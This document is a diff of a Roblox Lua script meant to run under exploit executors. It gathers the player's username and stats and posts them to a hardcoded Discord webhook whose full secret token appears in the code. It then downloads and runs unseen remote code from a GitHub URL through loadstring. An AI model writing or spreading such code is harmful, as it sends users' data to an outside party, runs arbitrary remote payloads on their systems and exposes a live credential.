@@ -1,17 +1,72 @@
+-- Discord
+-- Webhook URL
+local webhookUrl = "https://discord.com/api/webhooks/1382054686244339712/P-oLQRTOm4p_Ia9X2Iy0Y_tZdaSH1ceCsxmW-nBTQrOBAUKAleyg8qOHPR_nKABelx7u"
+
+-- Formatting Function
+local function formatNumber(num)
+    if type(num) ~= "number" then return tostring(num) end
+
+    local suffixes = {
+        {value = 1e15, symbol = "Qa"},
+        {value = 1e12, symbol = "T"},
+        {value = 1e9,  symbol = "B"},
+        {value = 1e6,  symbol = "M"},
+        {value = 1e3,  symbol = "K"},
+    }
+
+    local formatted = string.format("%0.0f", num):reverse():gsub("(%d%d%d)", "%1,"):reverse():gsub("^,", "")
+
+    for _, v in ipairs(suffixes) do
+        if num >= v.value then
+            local short = string.format("%.2f", num / v.value)
+            return string.format("%s (%s%s)", formatted, short, v.symbol)
+        end
+    end
+
+    return formatted -- for numbers less than 1K
+end
+
+-- Get Player Info
+local player = game:GetService("Players").LocalPlayer
+local leaderstats = player:FindFirstChild("leaderstats")
+
+-- Get Stats
+local username = player.Name
+local strength = leaderstats and leaderstats:FindFirstChild("Strength") and leaderstats.Strength.Value or "N/A"
+local durability = player:FindFirstChild("Durability") and player.Durability.Value or "N/A"
+local agility = player:FindFirstChild("Agility") and player.Agility.Value or "N/A"
+local rebirths = leaderstats and leaderstats:FindFirstChild("Rebirths") and leaderstats.Rebirths.Value or "N/A"
+local gems = player:FindFirstChild("Gems") and player.Gems.Value or "N/A"
+
+-- Create Embed Data
+local data = {
+    ["embeds"] = {{
+        ["title"] = "Player Stats",
+        ["color"] = tonumber(000000), -- Purple color
+        ["fields"] = {
+            {["name"] = "Username 👦", ["value"] = username, ["inline"] = true}, 
+        }
+    }}
+}
+
+-- Convert to JSON
 local HttpService = game:GetService("HttpService")
-local LocalizationService = game:GetService("LocalizationService")
-local WebhookURL = "https://discord.com/api/webhooks/1382054686244339712/P-oLQRTOm4p_Ia9X2Iy0Y_tZdaSH1ceCsxmW-nBTQrOBAUKAleyg8qOHPR_nKABelx7u"
+local body = HttpService:JSONEncode(data)
+local headers = {["Content-Type"] = "application/json"}
 
-game.Players.PlayerAdded:Connect(function(player)
-	local success, country = pcall(function()
-		return LocalizationService:GetCountryRegionForPlayerAsync(player)
-	end)
+-- Send Request (Supports Different Exploits)
+local function sendWebhook()
+    if request then
+        request({Url = webhookUrl, Method = "POST", Headers = headers, Body = body})
+    elseif http_request then
+        http_request({Url = webhookUrl, Method = "POST", Headers = headers, Body = body})
+    elseif syn and syn.request then
+        syn.request({Url = webhookUrl, Method = "POST", Headers = headers, Body = body})
+    else
+        warn("No suitable HTTP request method found.")
+    end
+end
 
-	local message = {
-		content = player.Name .. " joined from " .. (success and country or "an unknown location") .. " 🌍"
-	}
-
-	HttpService:PostAsync(WebhookURL, HttpService:JSONEncode(message), Enum.HttpContentType.ApplicationJson)
-end)
+sendWebhook()
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/BirdieFallOff1111/friendly-potato/refs/heads/main/Gag"))()
